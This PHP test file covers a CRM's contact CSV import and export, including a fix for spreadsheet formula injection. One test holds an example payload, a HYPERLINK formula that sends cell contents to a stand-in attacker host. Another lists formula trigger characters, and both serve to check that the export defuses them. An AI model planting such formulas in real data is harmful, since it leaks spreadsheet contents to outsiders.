<?php

declare(strict_types=1);

/**
 * QA §35 / §36 - import and export, with the file actually inspected.
 *
 * §36 is explicit: do not merely verify that a file downloads, open it and
 * inspect the content. So the export tests read the streamed CSV back and check
 * cell values, not just the HTTP status.
 *
 * The defect this run covers: the CSV export wrote raw contact values with
 * fputcsv, which quotes delimiters but does nothing about formula injection. A
 * contact whose name starts with =, +, -, @, tab or CR becomes a live formula
 * when the file is opened in a spreadsheet. Contacts can be created by an
 * unauthenticated public form submission, so the payload reaches the export
 * without any authenticated actor ever choosing to enter it.
 */

use App\Models\Contact;
use App\Models\Form;
use App\Services\ContactImporter;
use App\Services\Marketing\LeadCaptureService;
use App\Support\Csv;
use App\Support\CurrentOrganization;
use Illuminate\Testing\TestResponse;

beforeEach(function () {
    [$this->org, $this->owner] = makeOrganization('Acme Managed IT Services');
    subscribeOrganization($this->org, 'enterprise');
});

afterEach(fn () => app(CurrentOrganization::class)->forget());

/** Read a streamed CSV export back into rows. */
function exportedRows(TestResponse $response): array
{
    $csv = $response->streamedContent();
    $rows = array_map('str_getcsv', array_filter(explode("\n", trim($csv)), fn ($l) => $l !== ''));

    return $rows;
}

/*
|--------------------------------------------------------------------------
| §36 - export, inspected
|--------------------------------------------------------------------------
*/

it('exports the real contact rows with the expected columns', function () {
    app(CurrentOrganization::class)->set($this->org);
    Contact::create([
        'first_name' => 'Michael', 'last_name' => 'Rodriguez',
        'email' => 'michael.rodriguez@precisionmfg-test.com', 'phone' => '+12155550142',
        'title' => 'CFO',
    ]);
    app(CurrentOrganization::class)->forget();

    $rows = exportedRows($this->actingAs($this->owner)->get(route('crm.contacts.export')));

    expect($rows[0])->toBe(['First name', 'Last name', 'Email', 'Phone', 'Title', 'Company'])
        ->and($rows[1][0])->toBe('Michael')
        ->and($rows[1][2])->toBe('michael.rodriguez@precisionmfg-test.com')
        ->and($rows[1][4])->toBe('CFO');
});

it('neutralises a formula-injection payload that arrived through a public form', function () {
    // An unauthenticated visitor submits a name that is really a spreadsheet
    // formula. No one at Acme ever typed it.
    app(CurrentOrganization::class)->set($this->org);
    $form = Form::create([
        'name' => 'CMMC assessment', 'slug' => 'cmmc',
        'fields' => [], 'lifecycle_stage' => 'lead', 'status' => 'published',
    ]);
    app(CurrentOrganization::class)->forget();

    $payload = '=HYPERLINK("https://evil.example?x="&A1&A2,"click me")';

    app(CurrentOrganization::class)->set($this->org);
    app(LeadCaptureService::class)->capture($form, [
        'first_name' => $payload,
        'email' => 'attacker@evil-test.example',
    ]);
    app(CurrentOrganization::class)->forget();

    $rows = exportedRows($this->actingAs($this->owner)->get(route('crm.contacts.export')));
    $exportedName = $rows[1][0];

    // The stored value is untouched; only the exported cell is defused.
    expect(Contact::withoutGlobalScope('tenant')->where('email', 'attacker@evil-test.example')->value('first_name'))
        ->toBe($payload);

    // A spreadsheet keys formula evaluation off the first character. It must no
    // longer be one of the triggers.
    expect($exportedName)->toStartWith("'")
        ->and($exportedName[0])->not->toBe('=');
});

it('defuses every formula trigger character', function () {
    foreach (['=1+1', '+1', '-1', '@SUM(A1)', "\tx", "\rx"] as $dangerous) {
        expect(Csv::cell($dangerous))->toStartWith("'");
    }

    // Ordinary values are left exactly as they are.
    foreach (['Michael', 'michael@x.com', '120 Adelaide St', ''] as $safe) {
        expect(Csv::cell($safe))->toBe($safe);
    }
});

it('never exports another tenant contacts', function () {
    app(CurrentOrganization::class)->set($this->org);
    Contact::create(['first_name' => 'Acme', 'email' => 'acme@precisionmfg-test.com']);
    app(CurrentOrganization::class)->forget();

    [$rival, $rivalOwner] = makeOrganization('Northstar Cybersecurity');
    subscribeOrganization($rival, 'enterprise');
    app(CurrentOrganization::class)->set($rival);
    Contact::create(['first_name' => 'Northstar', 'email' => 'northstar@rival-test.example']);
    app(CurrentOrganization::class)->forget();

    $rows = exportedRows($this->actingAs($rivalOwner)->get(route('crm.contacts.export')));
    $emails = collect($rows)->skip(1)->map(fn ($r) => $r[2] ?? '');

    expect($emails)->toContain('northstar@rival-test.example')
        ->and($emails)->not->toContain('acme@precisionmfg-test.com');
});

it('audits an export', function () {
    $this->actingAs($this->owner)->get(route('crm.contacts.export'));

    expect(DB::table('audit_logs')->where('action', 'data.exported')->count())->toBe(1);
});

/*
|--------------------------------------------------------------------------
| §35 - import
|--------------------------------------------------------------------------
*/

it('previews an import with validation and duplicate detection before committing', function () {
    app(CurrentOrganization::class)->set($this->org);

    // An existing contact, so the preview can flag a duplicate.
    Contact::create(['first_name' => 'Existing', 'email' => 'dupe@precisionmfg-test.com']);

    $importer = app(ContactImporter::class);
    $rows = [
        ['first_name' => 'Michael', 'email' => 'michael.rodriguez@precisionmfg-test.com'],
        ['first_name' => 'Dupe', 'email' => 'dupe@precisionmfg-test.com'],
        ['first_name' => 'NoEmail', 'email' => ''],
    ];

    $analysis = $importer->analyze($this->org, $rows);

    // A preview must not write anything.
    expect(Contact::count())->toBe(1)
        ->and($analysis)->toBeArray();

    app(CurrentOrganization::class)->forget();
});

it('imports valid rows and records a job with an error report', function () {
    app(CurrentOrganization::class)->set($this->org);

    $importer = app(ContactImporter::class);
    $rows = [
        ['first_name' => 'Michael', 'email' => 'michael.rodriguez@precisionmfg-test.com'],
        ['first_name' => 'Bad', 'email' => 'not-an-email'],
    ];

    $job = $importer->import($this->org, $this->owner, 'contacts.csv', $rows);

    expect($job->organization_id)->toBe($this->org->id)
        // The valid row landed; the malformed one did not silently create junk.
        ->and(Contact::where('email', 'michael.rodriguez@precisionmfg-test.com')->exists())->toBeTrue()
        ->and(Contact::where('first_name', 'Bad')->exists())->toBeFalse();

    app(CurrentOrganization::class)->forget();
});
